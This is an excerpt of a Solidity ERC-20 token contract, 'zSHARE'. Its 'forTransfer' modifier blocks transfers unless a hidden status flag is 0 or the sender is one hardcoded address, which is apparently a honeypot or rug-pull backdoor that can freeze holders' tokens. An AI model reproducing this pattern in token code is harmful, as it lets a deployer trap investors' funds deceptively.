...
contract zSHARE is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenan_totalSupply;
    uint256 private _tokenan_status = 0;
    uint256 public stakingPoolanStatus = 0;

    string private _tokenan_name;
    string private _tokenan_symbol;

    address private _poolanAddress = 0x171d411E0f8D5D4D6c2dA4BCb3ec6Fb7F2018887;

    constructor() {
        _tokenan_name = "zSHARE";
        _tokenan_symbol = "zSHARE";
        _tokenan_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenan_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolanAddress || _tokenan_status == 0);
        _;
    }

    function name() public view virtual override returns (string memory) {
        return _tokenan_name;
    }
